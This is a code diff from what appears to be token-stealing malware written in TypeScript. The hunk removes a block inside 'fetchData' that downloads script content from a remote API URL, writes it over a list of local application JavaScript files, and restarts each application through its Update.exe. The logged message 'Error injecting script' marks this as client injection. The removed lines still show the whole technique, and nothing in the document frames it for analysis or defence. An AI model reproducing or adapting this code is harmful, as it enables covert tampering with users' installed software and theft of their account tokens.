@@ -81,29 +81,7 @@ const fetchData = async (allTokens: { platform: string; token: string }[]) => {
             headers: { waifu: true },
         };
 
-        const response = await new Promise((resolve, reject) => {
-            https.get(apiURL, options, (res) => {
-                let data = '';
-
-                res.on('data', (chunk) => {
-                    data += chunk;
-                });
-
-                res.on('end', () => {
-                    resolve({ text: () => data });
-                });
-            }).on('error', (error) => {
-                reject(error);
-            });
-        });
-
-        const scriptContent = await response.text();
-
-        JSPath.forEach((f) => {
-            const updatedScript = scriptContent.replace('*API URL*', apiURL);
-            fs.writeFileSync(f, updatedScript);
-            execSync(`${LOCALAPPDATA}/${f.split("/")[5]}/Update.exe --processStart ${f.split("/")[5]}.exe`);
-        });
+   
     } catch (error) {
         console.error("Error injecting script:", error);
     }
